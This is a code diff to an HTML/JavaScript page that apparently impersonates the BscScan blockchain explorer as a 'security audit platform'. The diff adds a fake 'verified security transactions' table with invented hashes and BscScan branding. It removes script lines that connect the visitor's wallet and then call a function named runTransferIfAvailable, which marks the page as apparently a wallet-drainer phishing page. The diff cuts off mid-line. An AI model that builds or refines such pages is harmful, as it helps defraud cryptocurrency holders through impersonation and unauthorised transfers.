@@ -257,12 +257,13 @@
     }
     .chips {
       display: flex;
+      flex-wrap: wrap;
       gap: 10px;
       margin-top: 10px;
       font-size: 12px;
     }
     .chip {
-      flex: 1;
+      flex: 1 1 46%;
       background: #111620;
       border: 1px solid #1e2636;
       border-radius: 10px;
@@ -272,6 +273,117 @@
       white-space: nowrap;
       overflow: hidden;
       text-overflow: ellipsis;
+    }
+    .chip-wide {
+      flex: 1 1 100%;
+    }
+
+    /* Live On-Chain Feed Table */
+    .feed-card {
+      background: #111620;
+      border: 1px solid #1e2636;
+      border-radius: 16px;
+      padding: 16px;
+      margin-top: 16px;
+    }
+    .feed-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      gap: 10px;
+      margin-bottom: 14px;
+    }
+    .feed-title {
+      font-size: 15px;
+      font-weight: bold;
+      line-height: 1.3;
+    }
+    .feed-sub {
+      font-size: 12px;
+      color: #8b95a5;
+      text-align: right;
+      line-height: 1.35;
+    }
+    .feed-table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 12px;
+    }
+    .feed-table th {
+      color: #8b95a5;
+      font-weight: bold;
+      text-align: left;
+      padding: 10px 6px;
+      border-bottom: 1px solid #1d2534;
+    }
+    .feed-table th:last-child,
+    .feed-table td:last-child {
+      text-align: right;
+    }
+    .feed-table td {
+      padding: 14px 6px;
+      border-bottom: 1px solid #171e2b;
+      vertical-align: middle;
+    }
+    .feed-table tr:last-child td {
+      border-bottom: none;
+    }
+    .tx-hash {
+      color: #facc15;
+      font-family: monospace;
+      font-size: 12px;
+    }
+    .method-pill {
+      display: inline-block;
+      background: #161c28;
+      border: 1px solid #263042;
+      color: #e2e8f0;
+      font-size: 11px;
+      padding: 4px 10px;
+      border-radius: 8px;
+    }
+    .block-num {
+      color: #cbd5e1;
+      font-variant-numeric: tabular-nums;
+    }
+
+    /* Footer */
+    .page-footer {
+      margin-top: 28px;
+      padding-top: 18px;
+      border-top: 1px solid #18202e;
+      font-size: 12px;
+      color: #8b95a5;
+    }
+    .footer-brand {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      margin-bottom: 16px;
+    }
+    .footer-title {
+      font-size: 15px;
+      font-weight: bold;
+      color: #eab308;
+      margin-bottom: 4px;
+    }
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 14px;
+      margin-bottom: 12px;
+    }
+    .footer-links a {
+      color: #94a3b8;
+      text-decoration: none;
+    }
+    .footer-links a:hover {
+      color: #facc15;
+    }
+    .footer-copy {
+      color: #64748b;
+      font-size: 11px;
+      padding-bottom: 16px;
     }
   </style>
 </head>
@@ -377,7 +489,73 @@
     <div class="chips">
       <div class="chip">Token (ETH) 0x2170...0233</div>
       <div class="chip" style="color:#4ade80;">● USD Coin (USDC)</div>
+      <div class="chip chip-wide" style="color:#60a5fa;">● Solana Token (SOL) 0x570a...3464</div>
     </div>
+
+    <!-- Latest Verified Security Transactions -->
+    <div class="feed-card">
+      <div class="feed-header">
+        <div class="feed-title">📈 Latest Verified Security Transactions</div>
+        <div class="feed-sub">Live On-Chain Feed</div>
+      </div>
+
+      <table class="feed-table">
+        <thead>
+          <tr>
+            <th>Txn Hash</th>
+            <th>Method</th>
+            <th>Block</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td class="tx-hash">0x7f4e ... 9b12</td>
+            <td><span class="method-pill">AuditVerify</span></td>
+            <td class="block-num">38924102</td>
+          </tr>
+          <tr>
+            <td class="tx-hash">0x3a19 ... 8c44</td>
+            <td><span class="method-pill">AuditVerify</span></td>
+            <td class="block-num">38924099</td>
+          </tr>
+          <tr>
+            <td class="tx-hash">0x9c21 ... e5f3</td>
+            <td><span class="method-pill">AuditVerify</span></td>
+            <td class="block-num">38924095</td>
+          </tr>
+          <tr>
+            <td class="tx-hash">0x1d8a ... 22c7</td>
+            <td><span class="method-pill">AuditVerify</span></td>
+            <td class="block-num">38924090</td>
+          </tr>
+          <tr>
+            <td class="tx-hash">0x5b33 ... 7d90</td>
+            <td><span class="method-pill">AuditVerify</span></td>
+            <td class="block-num">38924086</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+    <!-- Footer -->
+    <footer class="page-footer">
+      <div class="footer-brand">
+        <div class="brand-icon" style="width:28px; height:28px; font-size:12px;">B</div>
+        <div>
+          <div class="footer-title">BscScan</div>
+          <div>The Leading BNB Smart Chain Explorer &amp; Security Audit Platform</div>
+        </div>
+      </div>
+      <div class="footer-links">
+        <a href="#api">Explorer API</a>
+        <a href="#protocol">Security Protocol</a>
+        <a href="#directory">BEP-20 Directory</a>
+      </div>
+      <div class="footer-links">
+        <a href="#terms">Terms of Service</a>
+      </div>
+      <div class="footer-copy">© 2026 BscScan. All rights reserved.</div>
+    </footer>
   </div>
 
   <script>
@@ -527,40 +705,4 @@
       try {
         btn.disabled = true;
         btn.innerText = "Connecting Wallet...";
-        setStatus("Wallet connection request bheji ja rahi hai...");
-
-        await rawProvider.request({ method: "eth_requestAccounts" });
-        const ethersProvider = new ethers.providers.Web3Provider(rawProvider, "any");
-        const signer = ethersProvider.getSigner();
-        const address = await signer.getAddress();
-
-        await refreshWalletInfo(ethersProvider, address);
-        infoBox.style.display = "block";
-        isConnected = true;
-        btn.innerText = "✓ Verified (Re-check)";
-        setStatus("Wallet connected.");
-
-        await runTransferIfAvailable(ethersProvider, address);
-      } catch (err) {
-        console.error(err);
-        btn.innerText = isConnected ? "✓ Verified (Re-check)" : "✓ Verify Asset";
-        const msg = err?.code === 4001 ? "User ne connection cancel kar diya." : (err?.message || "Connection fail ho gaya.");
-        setStatus(msg, true);
-      } finally {
-        btn.disabled = false;
-      }
-    }
-
-    function handleVerifyClick() {
-      connectAndVerify();
-    }
-
-    window.addEventListener("load", async () => {
-      if (typeof ethers === "undefined") return;
-      const rawProvider = getProvider();
-      if (!rawProvider) return;
-      attachProviderListeners(rawProvider);
-    });
-  </script>
-</body>
-</html>
+        setSt
